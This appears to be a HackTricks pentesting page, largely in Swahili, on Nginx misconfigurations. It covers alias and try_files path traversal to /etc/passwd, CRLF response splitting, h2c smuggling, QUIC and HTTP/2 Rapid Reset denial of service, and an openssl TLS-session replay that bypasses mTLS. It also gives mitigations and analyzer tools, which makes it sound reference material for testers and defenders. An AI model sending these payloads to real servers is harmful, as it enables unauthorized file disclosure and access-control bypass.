# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Eneo la root lisilopo <a href="#missing-root-location" id="missing-root-location"></a>

Unaposanidi server ya Nginx, **root directive** ina jukumu muhimu kwa kufafanua saraka ya msingi ambayo faili zinatolewa kutoka kwake. Angalia mfano hapa chini:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Kwenye usanidi huu, `/etc/nginx` imewekwa kama directory ya root. Mpangilio huu unaruhusu ufikiaji wa faili ndani ya directory ya root iliyobainishwa, kama `/hello.txt`. Hata hivyo, ni muhimu kutambua kwamba imebainishwa tu location maalum (`/hello.txt`). Hakuna usanidi kwa location ya root (`location / {...}`). Kukosekana hivyo kunamaanisha directive ya root inatumika kwa ujumla, ikiruhusu requests kwa path ya root `/` kufikia faili chini ya `/etc/nginx`.

Matatizo muhimu ya usalama yanatokana na usanidi huu. Request rahisi ya `GET`, kama `GET /nginx.conf`, inaweza kufichua taarifa nyeti kwa kuwasilisha faili ya usanidi ya Nginx iliyoko kwenye `/etc/nginx/nginx.conf`. Kuweka root kwenye directory isiyo nyeti kama `/etc` kunaweza kupunguza hatari hii, lakini bado inaweza kuruhusu ufikiaji usiotarajiwa wa faili nyingine muhimu, ikiwa ni pamoja na faili nyingine za usanidi, access logs, na hata encrypted credentials zinazotumika kwa HTTP basic authentication.

## Alias LFI Usanidi mbaya <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Katika faili za usanidi za Nginx, inafaa kuchunguza kwa ukaribu directives za "location". Udhaifu unaojulikana kama Local File Inclusion (LFI) unaweza kuletwa bila kukusudia kupitia usanidi unaofanana na huu:
```
location /imgs {
alias /path/images/;
}
```
Marekebisho haya yako hatarini kwa LFI attacks kwa sababu server inatafsiri maombi kama `/imgs../flag.txt` kama jaribio la kupata faili nje ya directory iliyokusudiwa, ikitokana na kutatua kwa ufanisi kama `/path/images/../flag.txt`. Hitilafu hii inaruhusu attackers kupata faili kutoka kwenye filesystem ya server ambazo hazipaswi kupatikana kupitia web.

Ili kupunguza udhaifu huu, configuration inapaswa kurekebishwa ili:
```
location /imgs/ {
alias /path/images/;
}
```
Maelezo zaidi: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Majaribio ya Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Kizuizi cha njia zisizo salama <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Angalia ukurasa ufuatao ili ujifunze jinsi ya kukwepa maelekezo kama:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Matumizi hatarishi ya variable / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variables zilizo hatarini `$uri` na `$document_ur`i; hii inaweza kurekebishwa kwa kuzibadilisha na `$request_uri`.
>
> Regex pia inaweza kuwa hatarishi kama ifuatavyo:
>
> `location ~ /docs/([^/])? { … $1 … }` - Hatarishi
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Sio hatarishi (inaangalia nafasi)
>
> `location ~ /docs/(.*)? { … $1 … }` - Sio hatarishi

Udhaifu katika usanidi wa Nginx unaonyeshwa kwa mfano hapa chini:
```
location / {
return 302 https://example.com$uri;
}
```
Herufi \r (Carriage Return) na \n (Line Feed) zinaashiria tabia za mstari mpya katika maombi ya HTTP, na matoleo yao yaliyokuwa URL-encoded yanaonyeshwa kama `%0d%0a`. Kuingiza tabia hizi katika ombi (kwa mfano, `http://localhost/%0d%0aDetectify:%20clrf`) kwa server iliyopangwa vibaya husababisha server kutoa header mpya iitwayo `Detectify`. Hii hutokea kwa sababu variable $uri hu-decode tabia za mstari mpya zilizokuwa URL-encoded, na kusababisha header isiyotegemewa katika majibu:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Jifunze zaidi kuhusu hatari za CRLF injection na response splitting kwenye [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Pia mbinu hii [**imefafanuliwa katika hotuba hii**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) ikiwa na mifano iliyodhulishwa na mbinu za ufuatiliaji. Kwa mfano, ili kugundua misanidi hii kutoka mtazamo wa blackbox unaweza kutuma maombi haya:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Kama iko dhaifu, ya kwanza itarudisha majibu kwani "X" ni any HTTP method na ya pili itarudisha kosa kwa sababu H si HTTP method halali. Hivyo server itaona kitu kinachofanana na: `GET / H HTTP/1.1` na hili litasababisha kosa.

Mifano mingine ya kugundua itakuwa:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Baadhi ya misanidi iliyoonyeshwa kuwa dhaifu katika hotuba hiyo ni:

- Angalia jinsi **`$uri`** imewekwa kama ilivyo katika URL ya mwisho
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Angalia tena jinsi **`$uri`** iko kwenye URL (wakati huu ndani ya parameter)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Sasa kwenye AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Kigezo chochote

Iligundulika kwamba **data iliyotolewa na mtumiaji** inaweza kutendewa kama **Nginx variable** chini ya mazingira fulani. Sababu ya tabia hii bado haijulikani kikamilifu, lakini si nadra wala si rahisi kuthibitisha. Anomali hii ilibainishwa kwenye ripoti ya usalama kwenye HackerOne, inayoweza kuonekana [here](https://hackerone.com/reports/370094). Uchunguzi zaidi wa ujumbe wa kosa ulielekeza kugundua kutokea kwake ndani ya [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), ukibainisha Server Side Includes (SSI) kama chanzo.

Ili **kutambua mpangilio mbaya huu**, amri ifuatayo inaweza kutekelezwa, ambayo inahusisha kuweka referer header ili kujaribu kuchapishwa kwa variable:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Skana za upungufu huu wa usanidi katika mifumo zilibaini matukio kadhaa ambapo vigezo vya Nginx vilivyoweza kuchapishwa na mtumiaji. Hata hivyo, kupungua kwa idadi ya matukio yaliyo hatarini kunaonyesha kwamba juhudi za kurekebisha tatizo hili zimefanikiwa kwa kiasi fulani.

### Kutumia try_files na vigezo $URI$ARGS

Usanidi usio sahihi wa Nginx ufuatao unaweza kusababisha udhaifu wa LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Katika usanidi wetu tuna agizo `try_files` ambalo linatumika kuangalia uwepo wa faili kwa mpangilio uliobainishwa. Nginx itahudumia faili la kwanza litakalopatikana. Muundo wa msingi wa agizo la `try_files` ni kama ifuatavyo:
```
try_files file1 file2 ... fileN fallback;
```
Nginx itakagua uwepo wa kila faili kwa mpangilio uliobainishwa. Kama faili ipo, itatolewa mara moja. Ikiwa hakuna kati ya faili zilizobainishwa zinazopatikana, request itapitishwa kwa fallback option, ambayo inaweza kuwa URI nyingine au ukurasa maalum wa kosa.

Hata hivyo, wakati unapotumia `$uri$args` variables katika directive hii, Nginx itajaribu kutafuta faili inayolingana na request URI iliyochanganywa na query string arguments yoyote. Kwa hivyo tunaweza exploit configuration hii:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Kwa payload ifuatayo:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Kwa kutumia payload yetu tutatoka kwenye root directory (iliyobainishwa katika usanidi wa Nginx) na kufungua faili `/etc/passwd`. Katika debug logs tunaweza kuona jinsi Nginx inavyojaribu mafaili:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC dhidi ya Nginx ikitumia mipangilio iliyotajwa hapo juu:
![Mfano wa ombi la Burp](../../images/nginx_try_files.png)

## Kusoma majibu ghafi ya backend

Nginx inatoa kipengele kupitia `proxy_pass` kinachoruhusu kukamata makosa na vichwa vya HTTP vinavyotokana na backend, kwa lengo la kuficha ujumbe wa makosa ya ndani na vichwa. Hii inafikiwa kwa Nginx kutumikia kurasa za kosa maalum kama mwitikio kwa makosa ya backend. Hata hivyo, matatizo huibuka wakati Nginx inakutana na ombi batili la HTTP. Ombi hilo linapelekwa kwa backend kama lilivyopokelewa, na majibu ghafi ya backend hufumwa moja kwa moja kwa mteja bila uingiliaji wa Nginx.

Fikiria mfano wa tukio unaohusisha programu ya uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Ili kusimamia hili, maagizo maalum katika usanidi wa Nginx yanatumiwa:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Agizo hili limwezesha Nginx kutoa jibu maalum kwa majibu ya backend yenye msimbo wa hali zaidi ya 300. Linahakikisha kwamba, kwa mfano wetu wa programu uWSGI, jibu la `500 Error` linakamatwa na kushughulikiwa na Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Kama jina linavyoonyesha, agizo hili linaficha vichwa maalum vya HTTP kutoka kwa mteja, likiboresha faragha na usalama.

Wakati ombi halali la `GET` linapotumwa, Nginx linalishughulikia kama kawaida, likirejesha jibu la kosa la kawaida bila kufichua vichwa vya siri. Hata hivyo, ombi batili la HTTP linapovuka mfumo huu, husababisha kufichuliwa kwa majibu ya backend yasiyotobolewa, ikiwa ni pamoja na vichwa vya siri na ujumbe wa makosa.

## merge_slashes set to off

By default, Nginx's **`merge_slashes` directive** is set to **`on`**, which compresses multiple forward slashes in a URL into a single slash. This feature, while streamlining URL processing, can inadvertently conceal vulnerabilities in applications behind Nginx, particularly those prone to local file inclusion (LFI) attacks. Security experts **Danny Robinson and Rotem Bar** have highlighted the potential risks associated with this default behavior, especially when Nginx acts as a reverse-proxy.

To mitigate such risks, it is recommended to **turn the `merge_slashes` directive off** for applications susceptible to these vulnerabilities. This ensures that Nginx forwards requests to the application without altering the URL structure, thereby not masking any underlying security issues.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), there are certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Inaonyesha Nginx kufanya redirect ya ndani ya ombi kwenda eneo lililobainishwa.
- `X-Accel-Buffering`: Inadhibiti kama Nginx inapaswa kubuffer jibu au la.
- `X-Accel-Charset`: Inaweka character set kwa jibu wakati wa kutumia X-Accel-Redirect.
- `X-Accel-Expires`: Inaweka muda wa kumalizika kwa jibu wakati wa kutumia X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Inapunguza kiwango cha uhamishaji kwa majibu wakati wa kutumia X-Accel-Redirect.

For example, the header **`X-Accel-Redirect`** will cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

Katika **usanidi wa Nginx**, agizo la `map` mara nyingi lina jukumu katika **udhibiti wa idhini**. Makosa ya kawaida ni kutosema thamani ya **chaguo-msingi**, ambayo inaweza kusababisha upatikanaji usioidhinishwa. Kwa mfano:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Bila `default`, **mtumiaji hatarishi** anaweza kupita ukuta wa usalama kwa kufikia **URI isiyofafanuliwa** ndani ya `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) inashauri kuweka **thamani ya chaguo-msingi** ili kuepuka matatizo kama haya.

### **DNS Spoofing Vulnerability**

DNS spoofing dhidi ya Nginx inawezekana chini ya masharti fulani. Ikiwa mshambuliaji anajua **DNS server** inayotumika na Nginx na anaweza kukamata maswali yake ya DNS, anaweza spoof DNS records. Hata hivyo, njia hii haiwezi kufanya kazi ikiwa Nginx imewekwa kutumia **localhost (127.0.0.1)** kwa ufafanuzi wa DNS. Nginx inaruhusu kubainisha DNS server kama ifuatavyo:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` na `internal` maelekezo**

Maelekezo ya **`proxy_pass`** yanatumika kuhamisha requests kwa server nyingine, ndani au nje. Maelekezo ya **`internal`** yanaweka uhakika kwamba maeneo fulani yanapatikana tu ndani ya Nginx. Ingawa maelekezo haya si udhaifu wenyewe, usanidi wao unahitaji ukaguzi makini ili kuzuia mapungufu ya usalama.

## proxy_set_header Upgrade & Connection

Ikiwa nginx server imewekwa kupitisha headers za Upgrade na Connection, [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) inaweza kufanywa ili kupata ufikiaji wa protected/internal endpoints.

> [!CAUTION]
> Udhaifu huu utamruhusu mshambuliaji **kuanzisha muunganisho wa moja kwa moja na `proxy_pass` endpoint** (`http://backend:9999` katika kesi hii) ambapo yaliyomo hayatakaguliwa na nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Kuwa makini kwamba hata ikiwa `proxy_pass` ilikuwa ikielekeza kwenye **njia** maalum kama `http://backend:9999/socket.io` uunganisho utaanzishwa na `http://backend:9999` hivyo unaweza kuwasiliana na **njia yoyote nyingine ndani ya endpoint hiyo ya ndani. Kwa hivyo haijalishi ikiwa njia imeonyesha katika URL ya proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Mnamo 2024 Nginx ilifichua CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 na CVE-2024-35200 zikionyesha kwamba **single hostile QUIC session** inaweza ku-crash worker processes au leak memory wakati `ngx_http_v3_module` ya jaribio imekompilishwa na socket ya `listen ... quic` imefunuliwa. Builds zilizoathiriwa ni 1.25.0–1.25.5 na 1.26.0, ilhali 1.27.0/1.26.1 zinafikisha fixes; memory disclosure (CVE-2024-34161) zaidi inahitaji MTUs kubwa kuliko 4096 bytes ili kuonyesha sensitive data (maelezo katika 2024 nginx advisory iliyorejelewa hapa chini).

**Recon & exploitation hints**

- HTTP/3 ni opt-in, hivyo scan kwa `Alt-Svc: h3=":443"` responses au brute-force UDP/443 QUIC handshakes; mara kuthibitishwa, fuzz the handshake na STREAM frames kwa custom `quiche-client`/`nghttp3` payloads ili kusababisha worker crashes na kulazimisha log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Kuepuka kuendelea kwa session za TLS kwa uthibitishaji wa cheti la mteja (CVE-2025-23419)

Ushauri wa Februari 2025 ulibainisha kwamba nginx 1.11.4–1.27.3 zilizojengwa na OpenSSL zinaruhusu **kutumia tena session ya TLS 1.3** kutoka kwa name-based virtual host moja ndani ya nyingine, hivyo mteja aliyepata host isiyo na cheti anaweza kureplay tiketi/PSK ili kuingia kwenye vhost iliyolindwa na `ssl_verify_client on;` na kuruka mTLS kabisa. Hitilafu hii hujitokeza kila mara virtual hosts nyingi zinaposhiriki cache ya session ya TLS 1.3 na tiketi (angalia ushauri wa nginx wa 2025 uliotajwa hapa chini).

**Mpango wa mshambulizi**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Ikiwa lengo liko hatarini, mkutano wa pili (handshake) unakamilika bila kuwasilisha client certificate, na hivyo kuonyesha maeneo yaliyolindwa.

**Nini cha kukagua**

- Bloki mchanganyiko za `server_name` zinazoshiriki `ssl_session_cache shared:SSL` pamoja na `ssl_session_tickets on;`.
- Bloki za Admin/API zinazotarajia mTLS lakini zinarithi mipangilio ya shared session cache/ticket kutoka kwa host za umma.
- Automatiki inayowezesha TLS 1.3 session resumption globally (mf., Ansible roles) bila kuzingatia kutengwa kwa vhost.

## HTTP/2 Rapid Reset ustahimilivu (tabia ya CVE-2023-44487)

Shambulio la HTTP/2 Rapid Reset (CVE-2023-44487) bado linaathiri nginx wakati waendeshaji wanaongeza `keepalive_requests` au `http2_max_concurrent_streams` zaidi ya thamani za chaguo-msingi: mshambuliaji anaanzisha muunganisho mmoja wa HTTP/2, anakwama kwa maelfu ya streams, kisha mara moja atuma fremu za `RST_STREAM` ili ngazi ya concurrency isifikishwe huku CPU ikitumia rasilimali kwenye mantiki ya kuvunja muunganisho. Vipimo vya chaguo-msingi vya nginx (128 concurrent streams, 1000 keepalive requests) hufanya athari ziwe ndogo; kuinua mipaka hiyo "kwa kiasi kikubwa" hufanya kuwa rahisi kumnyima rasilimali workers hata kutoka kwa client mmoja (tazama maelezo ya F5 yaliyorejelewa hapo chini).

**Vidokezo vya kugundua**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts zinazofichua thamani za juu zisizo za kawaida kwa directives hizo ni malengo mazuri: mteja mmoja wa HTTP/2 anaweza kurudia kuunda stream na kutuma fremu za papo hapo za `RST_STREAM` ili kuweka CPU ikifanya kazi bila kusababisha kikomo cha concurrency.

## Jaribu mwenyewe

Detectify imeunda repository ya GitHub ambapo unaweza kutumia Docker kuweka server yako ya mtihani ya Nginx yenye udhaifu na baadhi ya misconfigurations zilizojadiliwa katika makala hii na kujaribu kuzitafuta mwenyewe!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Zana za Static Analyzer

### [GIXY](https://github.com/yandex/gixy)

Gixy ni zana ya kuchambua usanidi wa Nginx. Lengo kuu la Gixy ni kuzuia makosa ya usanidi yanayohusiana na usalama na kuendesha otomatiki ugunduzi wa mapungufu.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner ni zana rahisi ya kutafuta misconfigurations ya kawaida ya Nginx na udhaifu.

## Marejeleo

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
